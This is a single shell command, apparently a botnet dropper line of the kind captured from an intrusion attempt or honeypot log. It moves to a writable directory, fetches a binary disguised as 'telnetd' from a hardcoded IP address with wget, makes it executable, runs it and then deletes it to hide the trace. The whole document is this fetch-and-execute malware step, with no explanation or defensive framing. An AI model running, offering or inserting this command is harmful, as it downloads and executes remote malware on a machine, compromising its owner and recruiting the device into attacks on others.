cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.24.96.244/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
